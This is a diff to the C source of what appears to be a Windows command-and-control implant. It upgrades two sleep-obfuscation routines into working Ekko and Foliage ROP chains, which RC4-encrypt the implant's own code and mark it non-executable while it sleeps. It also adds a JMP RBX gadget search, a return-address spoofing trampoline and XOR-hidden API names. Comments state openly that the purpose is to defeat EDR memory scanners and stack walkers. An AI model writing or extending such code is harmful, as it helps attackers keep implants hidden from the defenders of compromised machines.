@@ -233,71 +233,160 @@ static text_section_t get_own_text_section(void) {
 }
 
 /* ================================================================== */
-/* SLEEP METHOD 1: Ekko                                                 */
+/* SLEEP METHOD 1: Ekko (Timer-Queue ROP)                               */
 /*                                                                      */
-/* Uses a WaitableTimer kernel object instead of Sleep() to avoid      */
-/* the kernel32!Sleep import-table IOC. Heap regions are XOR-encrypted  */
-/* during the wait so memory scanners find no plaintext C2 indicators.  */
+/* Uses CreateTimerQueueTimer with NtContinue as callback to build a    */
+/* ROP chain that executes entirely from kernel/ntdll context:          */
+/*   1. VirtualProtect(.text → RW)                                     */
+/*   2. SystemFunction032: RC4-encrypt .text                           */
+/*   3. [sleep duration passes]                                         */
+/*   4. SystemFunction032: RC4-decrypt .text                           */
+/*   5. VirtualProtect(.text → RX)                                     */
+/*   6. SetEvent → main thread wakes                                   */
 /*                                                                      */
-/* Why no .text permission flip: flipping .text to PAGE_NOACCESS and   */
-/* then calling WaitForSingleObject() crashes because the CPU's RET     */
-/* after WaitForSingleObject must jump back into .text, which is now    */
-/* inaccessible. The heap XOR alone is the primary stealth mechanism.  */
-/*                                                                      */
-/* All APIs resolved at runtime via GetProcAddress — no static imports. */
+/* .text is encrypted + non-executable during sleep, defeating EDR      */
+/* memory scanners. Heap regions are also XOR-encrypted.               */
 /* ================================================================== */
 
 #pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wcast-function-type"
 
-typedef HANDLE (WINAPI *pfnCreateWaitableTimerA_t)(
-    LPSECURITY_ATTRIBUTES, BOOL, LPCSTR);
-typedef BOOL (WINAPI *pfnSetWaitableTimer_t)(
-    HANDLE, const LARGE_INTEGER *, LONG, PTIMERAPCROUTINE, PVOID, BOOL);
+/* Forward declarations for functions defined later in this file */
+static void *find_ret_gadget(HMODULE hMod);
+#if ENABLE_SYNTHETIC_FRAMES
+static void synth_frames_init(void);
+static void synth_frames_push(void);
+static void synth_frames_pop(void);
+#endif
+
+typedef struct { DWORD Length; DWORD MaximumLength; PUCHAR Buffer; } EVASION_USTRING;
+typedef NTSTATUS (NTAPI *pfnNtContinue_t)(PCONTEXT, BOOLEAN);
+typedef NTSTATUS (WINAPI *pfnSystemFunction032_t)(EVASION_USTRING*, EVASION_USTRING*);
+typedef NTSTATUS (WINAPI *pfnNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
 
 static void rop_sleep_ekko(DWORD ms) {
+    /* "ntdll.dll" XOR 0x4B */
+    char sNt[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sNt[i]; i++) sNt[i] ^= EVASION_XOR_KEY;
+    HMODULE hNtdll = GetModuleHandleA(sNt);
+    SecureZeroMemory(sNt, sizeof(sNt));
+
     /* "kernel32.dll" XOR 0x4B */
     char sK32[] = {0x20,0x2E,0x39,0x25,0x2E,0x27,0x78,0x79,0x65,0x2F,0x27,0x27,0x00};
     for (int i = 0; sK32[i]; i++) sK32[i] ^= EVASION_XOR_KEY;
     HMODULE hK32 = GetModuleHandleA(sK32);
     SecureZeroMemory(sK32, sizeof(sK32));
-    if (!hK32) goto ekko_fallback;
 
-    /* "CreateWaitableTimerA" XOR 0x4B */
-    char sCwt[] = {0x08,0x39,0x2E,0x2A,0x3F,0x2E,0x1C,0x2A,0x22,0x3F,
-                   0x2A,0x29,0x27,0x2E,0x1F,0x22,0x26,0x2E,0x39,0x0A,0x00};
-    for (int i = 0; sCwt[i]; i++) sCwt[i] ^= EVASION_XOR_KEY;
-    pfnCreateWaitableTimerA_t fn_create_timer =
-        (pfnCreateWaitableTimerA_t)GetProcAddress(hK32, sCwt);
-    SecureZeroMemory(sCwt, sizeof(sCwt));
+    /* "advapi32.dll" XOR 0x4B */
+    char sAdv[] = {0x2A,0x2F,0x3D,0x2A,0x3B,0x22,0x78,0x79,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sAdv[i]; i++) sAdv[i] ^= EVASION_XOR_KEY;
+    HMODULE hAdv = GetModuleHandleA(sAdv);
+    SecureZeroMemory(sAdv, sizeof(sAdv));
 
-    /* "SetWaitableTimer" XOR 0x4B */
-    char sSwt[] = {0x18,0x2E,0x3F,0x1C,0x2A,0x22,0x3F,0x2A,0x29,0x27,
-                   0x2E,0x1F,0x22,0x26,0x2E,0x39,0x00};
-    for (int i = 0; sSwt[i]; i++) sSwt[i] ^= EVASION_XOR_KEY;
-    pfnSetWaitableTimer_t fn_set_timer =
-        (pfnSetWaitableTimer_t)GetProcAddress(hK32, sSwt);
-    SecureZeroMemory(sSwt, sizeof(sSwt));
-    if (!fn_create_timer || !fn_set_timer) goto ekko_fallback;
+    if (!hNtdll || !hK32 || !hAdv) goto ekko_fallback;
 
-    HANDLE hTimer = fn_create_timer(NULL, TRUE, NULL);
-    if (!hTimer) goto ekko_fallback;
+    /* "NtContinue" XOR 0x4B */
+    char sNc[] = {0x05,0x3F,0x08,0x24,0x25,0x3F,0x22,0x25,0x3E,0x2E,0x00};
+    for (int i = 0; sNc[i]; i++) sNc[i] ^= EVASION_XOR_KEY;
+    pfnNtContinue_t fn_cont = (pfnNtContinue_t)GetProcAddress(hNtdll, sNc);
+    SecureZeroMemory(sNc, sizeof(sNc));
 
-    /* Negative = relative delay in 100-ns units */
-    LARGE_INTEGER due;
-    due.QuadPart = -((LONGLONG)ms * 10000LL);
-    if (!fn_set_timer(hTimer, &due, 0, NULL, NULL, FALSE)) {
-        CloseHandle(hTimer);
+    /* "SystemFunction032" XOR 0x4B */
+    char sSf[] = {0x18,0x32,0x38,0x3F,0x2E,0x26,0x0D,0x3E,0x25,0x28,0x3F,0x22,0x24,0x25,0x7B,0x78,0x79,0x00};
+    for (int i = 0; sSf[i]; i++) sSf[i] ^= EVASION_XOR_KEY;
+    pfnSystemFunction032_t fn_rc4 = (pfnSystemFunction032_t)GetProcAddress(hAdv, sSf);
+    SecureZeroMemory(sSf, sizeof(sSf));
+
+    if (!fn_cont || !fn_rc4) goto ekko_fallback;
+
+    text_section_t txt = get_own_text_section();
+    if (!txt.base || !txt.size) goto ekko_fallback;
+
+    HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
+    HANDLE hTimerQueue = CreateTimerQueue();
+    if (!hEvent || !hTimerQueue) {
+        if (hEvent) CloseHandle(hEvent);
+        if (hTimerQueue) DeleteTimerQueue(hTimerQueue);
         goto ekko_fallback;
     }
 
-    /* Encrypt all registered heap regions before sleeping */
+    void *retGadget = find_ret_gadget(hNtdll);
+    if (!retGadget) {
+        DeleteTimerQueue(hTimerQueue);
+        CloseHandle(hEvent);
+        goto ekko_fallback;
+    }
+
+    UCHAR rc4Key[16];
+    BCryptGenRandom(NULL, rc4Key, sizeof(rc4Key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+
+    EVASION_USTRING uKey = { sizeof(rc4Key), sizeof(rc4Key), rc4Key };
+    EVASION_USTRING uImg = { (DWORD)txt.size, (DWORD)txt.size, (PUCHAR)txt.base };
+
+    ULONG_PTR retSled[16];
+    for (int i = 0; i < 16; i++) retSled[i] = (ULONG_PTR)retGadget;
+
+    CONTEXT ctxMain;
+    memset(&ctxMain, 0, sizeof(ctxMain));
+    RtlCaptureContext(&ctxMain);
+
+    if (WaitForSingleObject(hEvent, 0) == WAIT_OBJECT_0) {
+        heap_xor_all();
+        DeleteTimerQueue(hTimerQueue);
+        CloseHandle(hEvent);
+        return;
+    }
+
+    DWORD oldProt;
+    CONTEXT ctx[5];
+    for (int i = 0; i < 5; i++) {
+        memcpy(&ctx[i], &ctxMain, sizeof(CONTEXT));
+        ctx[i].Rsp = (DWORD64)&retSled[0];
+    }
+
+    /* Timer 0 (t=0ms): VirtualProtect(.text, PAGE_READWRITE) */
+    ctx[0].Rip = (DWORD64)VirtualProtect;
+    ctx[0].Rcx = (DWORD64)txt.base;
+    ctx[0].Rdx = (DWORD64)txt.size;
+    ctx[0].R8  = PAGE_READWRITE;
+    ctx[0].R9  = (DWORD64)&oldProt;
+
+    /* Timer 1 (t=100ms): RC4 encrypt .text */
+    ctx[1].Rip = (DWORD64)fn_rc4;
+    ctx[1].Rcx = (DWORD64)&uImg;
+    ctx[1].Rdx = (DWORD64)&uKey;
+
+    /* Timer 2 (t=ms): RC4 decrypt .text */
+    ctx[2].Rip = (DWORD64)fn_rc4;
+    ctx[2].Rcx = (DWORD64)&uImg;
+    ctx[2].Rdx = (DWORD64)&uKey;
+
+    /* Timer 3 (t=ms+100): VirtualProtect(.text, PAGE_EXECUTE_READ) */
+    ctx[3].Rip = (DWORD64)VirtualProtect;
+    ctx[3].Rcx = (DWORD64)txt.base;
+    ctx[3].Rdx = (DWORD64)txt.size;
+    ctx[3].R8  = PAGE_EXECUTE_READ;
+    ctx[3].R9  = (DWORD64)&oldProt;
+
+    /* Timer 4 (t=ms+200): SetEvent → wake main thread */
+    ctx[4].Rip = (DWORD64)SetEvent;
+    ctx[4].Rcx = (DWORD64)hEvent;
+
     heap_xor_all();
-    /* Block on the waitable timer — no code from our .text executes here */
-    WaitForSingleObject(hTimer, ms + 5000);
-    CloseHandle(hTimer);
-    /* Decrypt heap regions after waking */
+
+    HANDLE hT;
+    CreateTimerQueueTimer(&hT, hTimerQueue, (WAITORTIMERCALLBACK)fn_cont, &ctx[0], 0, 0, WT_EXECUTEINTIMERTHREAD);
+    CreateTimerQueueTimer(&hT, hTimerQueue, (WAITORTIMERCALLBACK)fn_cont, &ctx[1], 100, 0, WT_EXECUTEINTIMERTHREAD);
+    CreateTimerQueueTimer(&hT, hTimerQueue, (WAITORTIMERCALLBACK)fn_cont, &ctx[2], ms, 0, WT_EXECUTEINTIMERTHREAD);
+    CreateTimerQueueTimer(&hT, hTimerQueue, (WAITORTIMERCALLBACK)fn_cont, &ctx[3], ms + 100, 0, WT_EXECUTEINTIMERTHREAD);
+    CreateTimerQueueTimer(&hT, hTimerQueue, (WAITORTIMERCALLBACK)fn_cont, &ctx[4], ms + 200, 0, WT_EXECUTEINTIMERTHREAD);
+
+    WaitForSingleObject(hEvent, INFINITE);
+
+    /* RtlCaptureContext returns here after SetEvent fires */
     heap_xor_all();
+    DeleteTimerQueue(hTimerQueue);
+    CloseHandle(hEvent);
     return;
 
 ekko_fallback:
@@ -307,41 +396,153 @@ ekko_fallback:
 }
 
 /* ================================================================== */
-/* SLEEP METHOD 2: Foliage                                             */
+/* SLEEP METHOD 2: Foliage (APC-based ROP on sacrificial thread)       */
 /*                                                                      */
-/* Uses ntdll!NtDelayExecution (direct syscall stub in ntdll) instead  */
-/* of kernel32!Sleep. This removes the Sleep import-table IOC and uses  */
-/* a lower-level wait that bypasses any Sleep hooks installed by EDRs.  */
-/* Heap regions are XOR-encrypted during the delay.                     */
+/* Queues a chain of APCs on a sacrificial thread via QueueUserAPC,     */
+/* each invoking NtContinue with a crafted CONTEXT:                    */
+/*   1. VirtualProtect(.text → RW)                                     */
+/*   2. SystemFunction032: RC4-encrypt .text                           */
+/*   3. NtDelayExecution: sleep for ms                                 */
+/*   4. SystemFunction032: RC4-decrypt .text                           */
+/*   5. VirtualProtect(.text → RX)                                     */
+/*   6. SetEvent → main thread wakes                                   */
+/*                                                                      */
+/* The sacrificial thread calls SleepEx(INFINITE, TRUE) to enter an    */
+/* alertable wait, then APCs fire sequentially.                        */
 /* ================================================================== */
 
-typedef NTSTATUS (WINAPI *pfnNtDelayExecution_t)(BOOLEAN, PLARGE_INTEGER);
+static DWORD WINAPI foliage_sacrifice_thread(LPVOID param) {
+    (void)param;
+    SleepEx(INFINITE, TRUE);
+    return 0;
+}
 
 static void rop_sleep_foliage(DWORD ms) {
     /* "ntdll.dll" XOR 0x4B */
     char sNt[] = {0x25,0x3F,0x2F,0x27,0x27,0x65,0x2F,0x27,0x27,0x00};
     for (int i = 0; sNt[i]; i++) sNt[i] ^= EVASION_XOR_KEY;
-    HMODULE hNt = GetModuleHandleA(sNt);
+    HMODULE hNtdll = GetModuleHandleA(sNt);
     SecureZeroMemory(sNt, sizeof(sNt));
-    if (!hNt) goto foliage_fallback;
+
+    /* "advapi32.dll" XOR 0x4B */
+    char sAdv[] = {0x2A,0x2F,0x3D,0x2A,0x3B,0x22,0x78,0x79,0x65,0x2F,0x27,0x27,0x00};
+    for (int i = 0; sAdv[i]; i++) sAdv[i] ^= EVASION_XOR_KEY;
+    HMODULE hAdv = GetModuleHandleA(sAdv);
+    SecureZeroMemory(sAdv, sizeof(sAdv));
+
+    if (!hNtdll || !hAdv) goto foliage_fallback;
+
+    /* "NtContinue" XOR 0x4B */
+    char sNc[] = {0x05,0x3F,0x08,0x24,0x25,0x3F,0x22,0x25,0x3E,0x2E,0x00};
+    for (int i = 0; sNc[i]; i++) sNc[i] ^= EVASION_XOR_KEY;
+    pfnNtContinue_t fn_cont = (pfnNtContinue_t)GetProcAddress(hNtdll, sNc);
+    SecureZeroMemory(sNc, sizeof(sNc));
+
+    /* "SystemFunction032" XOR 0x4B */
+    char sSf[] = {0x18,0x32,0x38,0x3F,0x2E,0x26,0x0D,0x3E,0x25,0x28,0x3F,0x22,0x24,0x25,0x7B,0x78,0x79,0x00};
+    for (int i = 0; sSf[i]; i++) sSf[i] ^= EVASION_XOR_KEY;
+    pfnSystemFunction032_t fn_rc4 = (pfnSystemFunction032_t)GetProcAddress(hAdv, sSf);
+    SecureZeroMemory(sSf, sizeof(sSf));
 
     /* "NtDelayExecution" XOR 0x4B */
     char sNde[] = {0x05,0x3F,0x0F,0x2E,0x27,0x2A,0x32,0x0E,
                    0x33,0x2E,0x28,0x3E,0x3F,0x22,0x24,0x25,0x00};
     for (int i = 0; sNde[i]; i++) sNde[i] ^= EVASION_XOR_KEY;
-    pfnNtDelayExecution_t fn_delay =
-        (pfnNtDelayExecution_t)GetProcAddress(hNt, sNde);
+    pfnNtDelayExecution_t fn_delay = (pfnNtDelayExecution_t)GetProcAddress(hNtdll, sNde);
     SecureZeroMemory(sNde, sizeof(sNde));
-    if (!fn_delay) goto foliage_fallback;
 
-    /* ms → 100-nanosecond negative relative interval */
+    if (!fn_cont || !fn_rc4 || !fn_delay) goto foliage_fallback;
+
+    text_section_t txt = get_own_text_section();
+    if (!txt.base || !txt.size) goto foliage_fallback;
+
+    HANDLE hEvent = CreateEventA(NULL, FALSE, FALSE, NULL);
+    if (!hEvent) goto foliage_fallback;
+
+    HANDLE hThread = CreateThread(NULL, 0, foliage_sacrifice_thread, NULL, CREATE_SUSPENDED, NULL);
+    if (!hThread) {
+        CloseHandle(hEvent);
+        goto foliage_fallback;
+    }
+
+    void *retGadget = find_ret_gadget(hNtdll);
+    if (!retGadget) {
+        TerminateThread(hThread, 0);
+        CloseHandle(hThread);
+        CloseHandle(hEvent);
+        goto foliage_fallback;
+    }
+
+    UCHAR rc4Key[16];
+    BCryptGenRandom(NULL, rc4Key, sizeof(rc4Key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+
+    EVASION_USTRING uKey = { sizeof(rc4Key), sizeof(rc4Key), rc4Key };
+    EVASION_USTRING uImg = { (DWORD)txt.size, (DWORD)txt.size, (PUCHAR)txt.base };
+
     LARGE_INTEGER interval;
     interval.QuadPart = -((LONGLONG)ms * 10000LL);
 
-    /* Encrypt heap, sleep via direct syscall, then decrypt */
+    ULONG_PTR retSled[16];
+    for (int i = 0; i < 16; i++) retSled[i] = (ULONG_PTR)retGadget;
+
+    DWORD oldProt;
+    CONTEXT ctxBase;
+    memset(&ctxBase, 0, sizeof(ctxBase));
+    ctxBase.ContextFlags = CONTEXT_FULL;
+    RtlCaptureContext(&ctxBase);
+
+    CONTEXT ctx[6];
+    for (int i = 0; i < 6; i++) {
+        memcpy(&ctx[i], &ctxBase, sizeof(CONTEXT));
+        ctx[i].Rsp = (DWORD64)&retSled[0];
+    }
+
+    /* APC 0: VirtualProtect(.text, PAGE_READWRITE) */
+    ctx[0].Rip = (DWORD64)VirtualProtect;
+    ctx[0].Rcx = (DWORD64)txt.base;
+    ctx[0].Rdx = (DWORD64)txt.size;
+    ctx[0].R8  = PAGE_READWRITE;
+    ctx[0].R9  = (DWORD64)&oldProt;
+
+    /* APC 1: RC4 encrypt .text */
+    ctx[1].Rip = (DWORD64)fn_rc4;
+    ctx[1].Rcx = (DWORD64)&uImg;
+    ctx[1].Rdx = (DWORD64)&uKey;
+
+    /* APC 2: NtDelayExecution — sleep ms */
+    ctx[2].Rip = (DWORD64)fn_delay;
+    ctx[2].Rcx = (DWORD64)FALSE;
+    ctx[2].Rdx = (DWORD64)&interval;
+
+    /* APC 3: RC4 decrypt .text */
+    ctx[3].Rip = (DWORD64)fn_rc4;
+    ctx[3].Rcx = (DWORD64)&uImg;
+    ctx[3].Rdx = (DWORD64)&uKey;
+
+    /* APC 4: VirtualProtect(.text, PAGE_EXECUTE_READ) */
+    ctx[4].Rip = (DWORD64)VirtualProtect;
+    ctx[4].Rcx = (DWORD64)txt.base;
+    ctx[4].Rdx = (DWORD64)txt.size;
+    ctx[4].R8  = PAGE_EXECUTE_READ;
+    ctx[4].R9  = (DWORD64)&oldProt;
+
+    /* APC 5: SetEvent → wake main thread */
+    ctx[5].Rip = (DWORD64)SetEvent;
+    ctx[5].Rcx = (DWORD64)hEvent;
+
     heap_xor_all();
-    fn_delay(FALSE, &interval);
+
+    for (int i = 0; i < 6; i++)
+        QueueUserAPC((PAPCFUNC)fn_cont, hThread, (ULONG_PTR)&ctx[i]);
+
+    ResumeThread(hThread);
+    WaitForSingleObject(hEvent, ms + 5000);
+
     heap_xor_all();
+
+    WaitForSingleObject(hThread, 1000);
+    CloseHandle(hThread);
+    CloseHandle(hEvent);
     return;
 
 foliage_fallback:
@@ -361,15 +562,27 @@ foliage_fallback:
 /* ------------------------------------------------------------------ */
 static void encrypted_sleep(DWORD ms) {
     if (!g_heap_key_init) { Sleep(ms); return; }
+
+#if ENABLE_SYNTHETIC_FRAMES
+    {
+        static BOOL _synth_init = FALSE;
+        if (!_synth_init) { synth_frames_init(); _synth_init = TRUE; }
+        synth_frames_push();
+    }
+#endif
+
 #if SLEEP_METHOD == 1
     rop_sleep_ekko(ms);
 #elif SLEEP_METHOD == 2
     rop_sleep_foliage(ms);
 #else
-    /* SLEEP_METHOD == 0: plain XOR-encrypt + Sleep() + XOR-decrypt */
     heap_xor_all();
     Sleep(ms);
     heap_xor_all();
+#endif
+
+#if ENABLE_SYNTHETIC_FRAMES
+    synth_frames_pop();
 #endif
 }
 
@@ -841,7 +1054,6 @@ static void *find_ret_gadget(HMODULE hMod) {
         if (memcmp(sec[i].Name, ".text", 5) == 0) {
             BYTE *start = img + sec[i].VirtualAddress;
             SIZE_T len  = sec[i].Misc.VirtualSize;
-            /* Skip first 16 bytes to avoid hitting the section entry */
             for (SIZE_T j = 16; j < len; j++) {
                 if (start[j] == 0xC3)
                     return (void *)(start + j);
@@ -851,39 +1063,54 @@ static void *find_ret_gadget(HMODULE hMod) {
     return NULL;
 }
 
+static void *find_jmp_rbx_gadget(HMODULE hMod) {
+    if (!hMod) return NULL;
+
+    BYTE *img = (BYTE *)hMod;
+    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)img;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
+
+    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(img + dos->e_lfanew);
+    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
+
+    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(sec[i].Name, ".text", 5) == 0) {
+            BYTE *start = img + sec[i].VirtualAddress;
+            SIZE_T len  = sec[i].Misc.VirtualSize;
+            for (SIZE_T j = 16; j + 1 < len; j++) {
+                if (start[j] == 0xFF && start[j+1] == 0xE3)
+                    return (void *)(start + j);
+            }
+        }
+    }
+    return NULL;
+}
+
 /*
- * Trampoline: call `func(arg1)` while the return address visible on
- * the stack points to `gadget` (a RET inside a signed DLL).
+ * Trampoline: call func(arg1) so EDR stack walkers see `gadget`
+ * (a JMP RBX inside a signed DLL) as the return address, not us.
  *
- * Microsoft x64 ABI: first arg in RCX. We pass func in RDI, arg1 in
- * RSI, gadget in RDX (mapped from the C call). GCC inline asm clobbers
- * are declared so the compiler knows what we touch.
+ * Flow: RBX = continuation → push gadget → JMP func.
+ * func RETs into gadget → gadget does JMP RBX → continuation.
  */
 static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
     ULONG_PTR ret_val;
     __asm__ __volatile__ (
-        /* Save the real return address we need to get back to */
-        "lea   1f(%%rip), %%rax    \n\t"  /* rax = real continuation addr */
-        "push  %%rax               \n\t"  /* save it below the fake frame */
-        "push  %%rbp               \n\t"  /* save frame pointer           */
-        "mov   %%rsp, %%rbp        \n\t"
-
-        /* Build a fake frame: when `func` returns, it RETs into gadget,
-           and gadget (a bare 0xC3) RETs into our saved real address.    */
-        "push  %%rdx               \n\t"  /* gadget addr = fake retaddr  */
-        "mov   %%rsi, %%rcx        \n\t"  /* arg1 -> RCX (MS ABI)       */
-        "sub   $0x20, %%rsp        \n\t"  /* shadow space                */
-        "call  *%%rdi              \n\t"  /* call func                   */
-        "add   $0x20, %%rsp        \n\t"
-        "add   $0x8,  %%rsp        \n\t"  /* pop the gadget slot         */
-
-        "mov   %%rbp, %%rsp        \n\t"  /* restore stack               */
-        "pop   %%rbp               \n\t"
-        "add   $0x8,  %%rsp        \n\t"  /* pop saved real ret addr     */
-        "1:                        \n\t"
+        "push  %%rbx              \n\t"
+        "lea   1f(%%rip), %%rbx   \n\t"
+        "sub   $0x20, %%rsp       \n\t"
+        "push  %[gadget]          \n\t"
+        "mov   %[arg1], %%rcx     \n\t"
+        "jmp   *%[func]           \n\t"
+        "1:                       \n\t"
+        "add   $0x20, %%rsp       \n\t"
+        "pop   %%rbx              \n\t"
         : "=a" (ret_val)
-        : "D" (func), "S" (arg1), "d" (gadget)
-        : "rcx", "r8", "r9", "r10", "r11", "memory", "cc"
+        : [func] "r" (func),
+          [arg1] "r" (arg1),
+          [gadget] "r" (gadget)
+        : "rcx", "rdx", "r8", "r9", "r10", "r11", "memory", "cc"
     );
     return ret_val;
 }
@@ -891,6 +1118,7 @@ static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
 #else
 /* x86 / other arch: stubs */
 static void *find_ret_gadget(HMODULE hMod) { (void)hMod; return NULL; }
+static void *find_jmp_rbx_gadget(HMODULE hMod) { (void)hMod; return NULL; }
 static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
     (void)gadget;
     typedef ULONG_PTR (*fn_t)(void *);
@@ -900,6 +1128,7 @@ static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
 
 #else /* ENABLE_RET_ADDR_SPOOF == 0 */
 static void *find_ret_gadget(HMODULE hMod) { (void)hMod; return NULL; }
+static void *find_jmp_rbx_gadget(HMODULE hMod) { (void)hMod; return NULL; }
 static ULONG_PTR spoof_call(void *func, void *arg1, void *gadget) {
     (void)gadget;
     typedef ULONG_PTR (*fn_t)(void *);
